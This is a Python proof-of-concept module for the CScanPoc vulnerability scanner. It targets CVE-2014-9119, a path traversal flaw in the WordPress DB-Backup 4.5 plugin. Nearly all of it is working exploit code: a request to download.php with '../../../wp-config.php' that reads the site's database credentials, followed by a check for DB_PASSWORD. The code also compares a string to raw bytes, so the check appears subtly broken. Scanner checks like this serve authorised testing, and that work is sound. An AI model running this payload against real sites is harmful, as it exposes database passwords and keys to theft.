# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'WordPress_0024'  # 平台漏洞编号，留空
    name = 'WordPress DB-Backup Plugin 4.5 /download.php 任意文件下载漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-11-26'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        DB Backup plugin for WordPress contains a flaw that allows traversing outside of
        a restricted path. The issue is due to the download.php script not properly
        sanitizing user input, specifically path traversal style attacks (e.g. '../').
        With a specially crafted request, a remote attacker can gain read access to
        arbitrary files, limited by system operational access control. This
        vulnerability can be used to get WordPress authentication keys and salts,
        database address and credentials, which can be used in certain environments to
        elevate privileges and execute malicious PHP code.
        Root cause:
        Unsanitized user input to readfile() function.
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9119'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2014-9119'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress DB-Backup Plugin 4.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ced5c830-8c05-413b-ad41-a67895af73c8'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if 'DB_PASSWORD' in content and 'wp-settings.php' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
